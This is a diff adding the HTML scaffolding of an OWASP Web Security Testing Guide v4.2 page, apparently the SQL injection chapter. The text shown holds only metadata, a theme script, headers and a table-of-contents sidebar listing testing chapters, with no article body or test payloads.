@@ -1,0 +1,1438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WSTG - v4.2 | OWASP Web Security Testing Guide</title>
+<meta name="description" content="The premier cybersecurity testing resource for web application developers and security professionals.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="WSTG - v4.2">
+<meta property="og:description" content="The premier cybersecurity testing resource for web application developers and security professionals.">
+<meta property="og:image" content="https://wstg.owasp.org/assets/images/wstg-cover.png">
+<meta property="og:url" content="https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection/">
+<meta property="og:site_name" content="OWASP Web Security Testing Guide">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="WSTG - v4.2">
+<meta name="twitter:description" content="The premier cybersecurity testing resource for web application developers and security professionals.">
+<meta name="twitter:image" content="https://wstg.owasp.org/assets/images/wstg-cover.png">
+<link rel="canonical" href="https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection/">
+<link rel="icon" href="/assets/images/wstg-shield.png" type="image/png">
+<link rel="apple-touch-icon" href="/assets/images/wstg-shield.png">
+<meta name="theme-color" content="#1a1d23">
+<script>
+(function () {
+  var t;
+  try { t = localStorage.getItem('wstg-theme'); } catch (e) {}
+  var effective;
+  if (!t || t === 'system') {
+    effective = window.matchMedia && matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+  } else {
+    effective = t;
+  }
+  document.documentElement.setAttribute('data-theme', effective);
+})();
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/base.css">
+<link rel="stylesheet" href="/assets/css/shell.css">
+<link rel="stylesheet" href="/assets/css/buttons.css">
+<link rel="stylesheet" href="/assets/css/footer.css">
+<link rel="stylesheet" href="/assets/css/site.css">
+
+<link rel="stylesheet" href="/assets/css/wstg-nav.css">
+
+
+</head>
+<body id="top" class="page-document">
+  <div class="skip-links">
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+    <a href="#page-end" class="skip-link">Skip to bottom of page</a>
+  </div>
+  <header class="site-header">
+  <div class="container container-wide header-inner">
+    <div class="header-left">
+      <a href="/" class="header-brand" aria-label="WSTG home">
+        <img class="header-brand-shield" src="/assets/images/wstg-shield.png" width="40" height="40" alt="">
+        <span class="header-brand-name"><span class="wstg-wordmark">WSTG</span></span>
+      </a>
+    </div>
+    <div class="header-actions">
+      <button type="button" id="theme-toggle" class="theme-toggle" aria-label="Theme: system. Click to switch." title="Theme">
+        <span class="theme-toggle-icon-wrap">
+          <svg class="theme-toggle-icon" viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
+            <path fill="currentColor" d="M12 3a9 9 0 1 0 9 9c0-.46-.04-.92-.1-1.36a5.389 5.389 0 0 1-4.4 2.26 5.403 5.403 0 0 1-3.14-9.8c-.44-.06-.9-.1-1.36-.1z"/>
+          </svg>
+        </span>
+        <span class="theme-toggle-label" aria-hidden="true">Theme</span>
+      </button>
+      <a href="https://owasp.org/" class="ext-link" rel="noopener noreferrer" target="_blank" aria-label="OWASP (external)">
+        <img class="owasp-wordmark-img" src="/assets/images/owasp-logo-header.svg" alt="" width="133" height="40">
+        <span class="sr-only"> (opens in new window)</span>
+      </a>
+    </div>
+  </div>
+</header>
+
+  <header class="project-header">
+  <div class="container container-wide">
+    <div class="project-header-top">
+      <h1 class="project-title">OWASP Web Security Testing Guide</h1>
+      <p class="project-subtitle">v4.2</p>
+    </div>
+    
+    <p class="project-tagline">Web application security testing guidance.</p>
+    
+  </div>
+</header>
+
+
+<div class="channel-banners" role="banner">
+  
+
+  
+  <div class="channel-banner channel-banner--stable">
+    You're viewing the current stable version of the Web Security Testing Guide project.
+  </div>
+  
+
+  
+  
+  
+    
+  
+</div>
+
+<main id="main-content" class="site-main">
+  <div class="container container-wide">
+    <div class="doc-nav-bar">
+      <button type="button" id="doc-nav-toggle" class="doc-nav-toggle" aria-controls="doc-sidebar" aria-expanded="false">
+        <span class="doc-nav-toggle-icon" aria-hidden="true"></span>
+        Contents
+      </button>
+    </div>
+    <div class="doc-layout">
+      <div id="doc-nav-backdrop" class="doc-nav-backdrop" hidden></div>
+      <aside id="doc-sidebar" class="doc-sidebar" aria-label="Guide contents">
+        <button type="button" id="doc-nav-close" class="doc-nav-close" aria-label="Close contents">
+          <span aria-hidden="true">&times;</span>
+        </button>
+        
+
+
+<nav class="wstg-nav" id="wstg-nav-v42" aria-label="WSTG Contents (v4.2)">
+  <p class="wstg-nav-home"><a href="/">← Home</a></p>
+  <h2 class="wstg-nav-title"><a href="/v4.2/">WSTG Contents (v4.2)</a></h2>
+  <label class="visually-hidden" for="wstg-nav-filter-v42">Filter contents</label>
+  <input id="wstg-nav-filter-v42" class="wstg-nav-filter" type="search" placeholder="Filter (XSS, sqli, WSTG-INPV-01, 4.7)" autocomplete="off">
+  <div class="wstg-nav-controls">
+    <button type="button" data-wstg-expand>Expand All</button>
+    <button type="button" data-wstg-collapse>Collapse All</button>
+  </div>
+  <ul class="wstg-nav-list">
+    
+    
+<li class="wstg-nav-item" data-title="0. Foreword by Eoin Keary">
+<a href="/v4.2/0-Foreword/" data-nav-url="0-Foreword/" title="0. Foreword by Eoin Keary">0. Foreword by Eoin Keary</a>
+</li>
+<li class="wstg-nav-item" data-title="1. Frontispiece">
+<a href="/v4.2/1-Frontispiece/" data-nav-url="1-Frontispiece/" title="1. Frontispiece">1. Frontispiece</a>
+</li>
+<li class="wstg-nav-item" data-title="2. Introduction">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/2-Introduction/" data-nav-url="2-Introduction/" title="2. Introduction">2. Introduction</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="2.1 The OWASP Testing Project">
+<a href="/v4.2/2-Introduction/#the-owasp-testing-project" data-nav-url="2-Introduction/#the-owasp-testing-project" title="2.1 The OWASP Testing Project">2.1 The OWASP Testing Project</a>
+</li>
+<li class="wstg-nav-item" data-title="2.2 Principles of Testing">
+<a href="/v4.2/2-Introduction/#principles-of-testing" data-nav-url="2-Introduction/#principles-of-testing" title="2.2 Principles of Testing">2.2 Principles of Testing</a>
+</li>
+<li class="wstg-nav-item" data-title="2.3 Testing Techniques Explained">
+<a href="/v4.2/2-Introduction/#testing-techniques-explained" data-nav-url="2-Introduction/#testing-techniques-explained" title="2.3 Testing Techniques Explained">2.3 Testing Techniques Explained</a>
+</li>
+<li class="wstg-nav-item" data-title="2.4 Manual Inspections and Reviews">
+<a href="/v4.2/2-Introduction/#manual-inspections-and-reviews" data-nav-url="2-Introduction/#manual-inspections-and-reviews" title="2.4 Manual Inspections and Reviews">2.4 Manual Inspections and Reviews</a>
+</li>
+<li class="wstg-nav-item" data-title="2.5 Threat Modeling">
+<a href="/v4.2/2-Introduction/#threat-modeling" data-nav-url="2-Introduction/#threat-modeling" title="2.5 Threat Modeling">2.5 Threat Modeling</a>
+</li>
+<li class="wstg-nav-item" data-title="2.6 Source Code Review">
+<a href="/v4.2/2-Introduction/#source-code-review" data-nav-url="2-Introduction/#source-code-review" title="2.6 Source Code Review">2.6 Source Code Review</a>
+</li>
+<li class="wstg-nav-item" data-title="2.7 Penetration Testing">
+<a href="/v4.2/2-Introduction/#penetration-testing" data-nav-url="2-Introduction/#penetration-testing" title="2.7 Penetration Testing">2.7 Penetration Testing</a>
+</li>
+<li class="wstg-nav-item" data-title="2.8 The Need for a Balanced Approach">
+<a href="/v4.2/2-Introduction/#the-need-for-a-balanced-approach" data-nav-url="2-Introduction/#the-need-for-a-balanced-approach" title="2.8 The Need for a Balanced Approach">2.8 The Need for a Balanced Approach</a>
+</li>
+<li class="wstg-nav-item" data-title="2.9 Deriving Security Test Requirements">
+<a href="/v4.2/2-Introduction/#deriving-security-test-requirements" data-nav-url="2-Introduction/#deriving-security-test-requirements" title="2.9 Deriving Security Test Requirements">2.9 Deriving Security Test Requirements</a>
+</li>
+<li class="wstg-nav-item" data-title="2.10 Security Tests Integrated in Development and Testing Workflows">
+<a href="/v4.2/2-Introduction/#security-tests-integrated-in-development-and-testing-workflows" data-nav-url="2-Introduction/#security-tests-integrated-in-development-and-testing-workflows" title="2.10 Security Tests Integrated in Development and Testing Workflows">2.10 Security Tests Integrated in Development and Testing Workflows</a>
+</li>
+<li class="wstg-nav-item" data-title="2.11 Security Test Data Analysis and Reporting">
+<a href="/v4.2/2-Introduction/#security-test-data-analysis-and-reporting" data-nav-url="2-Introduction/#security-test-data-analysis-and-reporting" title="2.11 Security Test Data Analysis and Reporting">2.11 Security Test Data Analysis and Reporting</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="3. The OWASP Testing Framework">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/3-The_OWASP_Testing_Framework/" data-nav-url="3-The_OWASP_Testing_Framework/" title="3. The OWASP Testing Framework">3. The OWASP Testing Framework</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="3.1 The Web Security Testing Framework">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework" title="3.1 The Web Security Testing Framework">3.1 The Web Security Testing Framework</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="3.2 Phase 1 Before Development Begins">
+<a href="/v4.2/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-1-before-development-begins" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-1-before-development-begins" title="3.2 Phase 1 Before Development Begins">3.2 Phase 1 Before Development Begins</a>
+</li>
+<li class="wstg-nav-item" data-title="3.3 Phase 2 During Definition and Design">
+<a href="/v4.2/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-2-during-definition-and-design" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-2-during-definition-and-design" title="3.3 Phase 2 During Definition and Design">3.3 Phase 2 During Definition and Design</a>
+</li>
+<li class="wstg-nav-item" data-title="3.4 Phase 3 During Development">
+<a href="/v4.2/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-3-during-development" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-3-during-development" title="3.4 Phase 3 During Development">3.4 Phase 3 During Development</a>
+</li>
+<li class="wstg-nav-item" data-title="3.5 Phase 4 During Deployment">
+<a href="/v4.2/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-4-during-deployment" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-4-during-deployment" title="3.5 Phase 4 During Deployment">3.5 Phase 4 During Deployment</a>
+</li>
+<li class="wstg-nav-item" data-title="3.6 Phase 5 During Maintenance and Operations">
+<a href="/v4.2/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-5-during-maintenance-and-operations" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-5-during-maintenance-and-operations" title="3.6 Phase 5 During Maintenance and Operations">3.6 Phase 5 During Maintenance and Operations</a>
+</li>
+<li class="wstg-nav-item" data-title="3.7 A Typical SDLC Testing Workflow">
+<a href="/v4.2/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#a-typical-sdlc-testing-workflow" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#a-typical-sdlc-testing-workflow" title="3.7 A Typical SDLC Testing Workflow">3.7 A Typical SDLC Testing Workflow</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="3.8 Penetration Testing Methodologies">
+<a href="/v4.2/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies" data-nav-url="3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies" title="3.8 Penetration Testing Methodologies">3.8 Penetration Testing Methodologies</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4. Web Application Security Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/" data-nav-url="4-Web_Application_Security_Testing/" title="4. Web Application Security Testing">4. Web Application Security Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.0 Introduction and Objectives">
+<a href="/v4.2/4-Web_Application_Security_Testing/00-Introduction_and_Objectives/" data-nav-url="4-Web_Application_Security_Testing/00-Introduction_and_Objectives/" title="4.0 Introduction and Objectives">4.0 Introduction and Objectives</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1 Information Gathering">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/" title="4.1 Information Gathering">4.1 Information Gathering</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.1.1 Conduct Search Engine Discovery Reconnaissance for Information Leakage" data-hints="wstg-info-01 info-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage" title="4.1.1 Conduct Search Engine Discovery Reconnaissance for Information Leakage">4.1.1 Conduct Search Engine Discovery Reconnaissance for Information Leakage</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.2 Fingerprint Web Server" data-hints="wstg-info-02 info-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server" title="4.1.2 Fingerprint Web Server">4.1.2 Fingerprint Web Server</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.3 Review Webserver Metafiles for Information Leakage" data-hints="robots robots.txt sitemap sitemap.xml wstg-info-03 info-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage" title="4.1.3 Review Webserver Metafiles for Information Leakage">4.1.3 Review Webserver Metafiles for Information Leakage</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.4 Enumerate Applications on Webserver" data-hints="wstg-info-04 info-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver" title="4.1.4 Enumerate Applications on Webserver">4.1.4 Enumerate Applications on Webserver</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.5 Review Webpage Content for Information Leakage" data-hints="wstg-info-05 info-05">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage" title="4.1.5 Review Webpage Content for Information Leakage">4.1.5 Review Webpage Content for Information Leakage</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.6 Identify Application Entry Points" data-hints="wstg-info-06 info-06">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points" title="4.1.6 Identify Application Entry Points">4.1.6 Identify Application Entry Points</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.7 Map Execution Paths Through Application" data-hints="wstg-info-07 info-07">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application" title="4.1.7 Map Execution Paths Through Application">4.1.7 Map Execution Paths Through Application</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.8 Fingerprint Web Application Framework" data-hints="wstg-info-08 info-08">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework" title="4.1.8 Fingerprint Web Application Framework">4.1.8 Fingerprint Web Application Framework</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.9 Fingerprint Web Application" data-hints="wstg-info-09 info-09">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application" title="4.1.9 Fingerprint Web Application">4.1.9 Fingerprint Web Application</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.10 Map Application Architecture" data-hints="wstg-info-10 info-10">
+<a href="/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture" title="4.1.10 Map Application Architecture">4.1.10 Map Application Architecture</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.2 Configuration and Deployment Management Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/" title="4.2 Configuration and Deployment Management Testing">4.2 Configuration and Deployment Management Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.2.1 Test Network Infrastructure Configuration" data-hints="wstg-conf-01 conf-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration" title="4.2.1 Test Network Infrastructure Configuration">4.2.1 Test Network Infrastructure Configuration</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.2 Test Application Platform Configuration" data-hints="wstg-conf-02 conf-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration" title="4.2.2 Test Application Platform Configuration">4.2.2 Test Application Platform Configuration</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.3 Test File Extensions Handling for Sensitive Information" data-hints="wstg-conf-03 conf-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information" title="4.2.3 Test File Extensions Handling for Sensitive Information">4.2.3 Test File Extensions Handling for Sensitive Information</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.4 Review Old Backup and Unreferenced Files for Sensitive Information" data-hints="wstg-conf-04 conf-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information" title="4.2.4 Review Old Backup and Unreferenced Files for Sensitive Information">4.2.4 Review Old Backup and Unreferenced Files for Sensitive Information</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.5 Enumerate Infrastructure and Application Admin Interfaces" data-hints="wstg-conf-05 conf-05">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces" title="4.2.5 Enumerate Infrastructure and Application Admin Interfaces">4.2.5 Enumerate Infrastructure and Application Admin Interfaces</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.6 Test HTTP Methods" data-hints="wstg-conf-06 conf-06">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods" title="4.2.6 Test HTTP Methods">4.2.6 Test HTTP Methods</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.7 Test HTTP Strict Transport Security" data-hints="hsts headers wstg-conf-07 conf-07">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security" title="4.2.7 Test HTTP Strict Transport Security">4.2.7 Test HTTP Strict Transport Security</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.8 Test RIA Cross Domain Policy" data-hints="crossdomain.xml clientaccesspolicy wstg-conf-08 conf-08">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy" title="4.2.8 Test RIA Cross Domain Policy">4.2.8 Test RIA Cross Domain Policy</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.9 Test File Permission" data-hints="wstg-conf-09 conf-09">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" title="4.2.9 Test File Permission">4.2.9 Test File Permission</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.10 Test for Subdomain Takeover" data-hints="wstg-conf-10 conf-10">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover" title="4.2.10 Test for Subdomain Takeover">4.2.10 Test for Subdomain Takeover</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.11 Test Cloud Storage" data-hints="s3 bucket blob storage wstg-conf-11 conf-11">
+<a href="/v4.2/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage" title="4.2.11 Test Cloud Storage">4.2.11 Test Cloud Storage</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.3 Identity Management Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/03-Identity_Management_Testing/" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/" title="4.3 Identity Management Testing">4.3 Identity Management Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.3.1 Test Role Definitions" data-hints="wstg-idnt-01 idnt-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions" title="4.3.1 Test Role Definitions">4.3.1 Test Role Definitions</a>
+</li>
+<li class="wstg-nav-item" data-title="4.3.2 Test User Registration Process" data-hints="wstg-idnt-02 idnt-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process" title="4.3.2 Test User Registration Process">4.3.2 Test User Registration Process</a>
+</li>
+<li class="wstg-nav-item" data-title="4.3.3 Test Account Provisioning Process" data-hints="wstg-idnt-03 idnt-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process" title="4.3.3 Test Account Provisioning Process">4.3.3 Test Account Provisioning Process</a>
+</li>
+<li class="wstg-nav-item" data-title="4.3.4 Testing for Account Enumeration and Guessable User Account" data-hints="wstg-idnt-04 idnt-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account" title="4.3.4 Testing for Account Enumeration and Guessable User Account">4.3.4 Testing for Account Enumeration and Guessable User Account</a>
+</li>
+<li class="wstg-nav-item" data-title="4.3.5 Testing for Weak or Unenforced Username Policy" data-hints="wstg-idnt-05 idnt-05">
+<a href="/v4.2/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy" title="4.3.5 Testing for Weak or Unenforced Username Policy">4.3.5 Testing for Weak or Unenforced Username Policy</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.4 Authentication Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/" title="4.4 Authentication Testing">4.4 Authentication Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.4.1 Testing for Credentials Transported over an Encrypted Channel" data-hints="tls ssl https wstg-athn-01 athn-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel" title="4.4.1 Testing for Credentials Transported over an Encrypted Channel">4.4.1 Testing for Credentials Transported over an Encrypted Channel</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.2 Testing for Default Credentials" data-hints="wstg-athn-02 athn-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials" title="4.4.2 Testing for Default Credentials">4.4.2 Testing for Default Credentials</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.3 Testing for Weak Lock Out Mechanism" data-hints="rate limit bruteforce brute force account lockout wstg-athn-03 athn-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism" title="4.4.3 Testing for Weak Lock Out Mechanism">4.4.3 Testing for Weak Lock Out Mechanism</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.4 Testing for Bypassing Authentication Schema" data-hints="wstg-athn-04 athn-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema" title="4.4.4 Testing for Bypassing Authentication Schema">4.4.4 Testing for Bypassing Authentication Schema</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.5 Testing for Vulnerable Remember Password" data-hints="wstg-athn-05 athn-05">
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password" title="4.4.5 Testing for Vulnerable Remember Password">4.4.5 Testing for Vulnerable Remember Password</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.6 Testing for Browser Cache Weaknesses" data-hints="wstg-athn-06 athn-06">
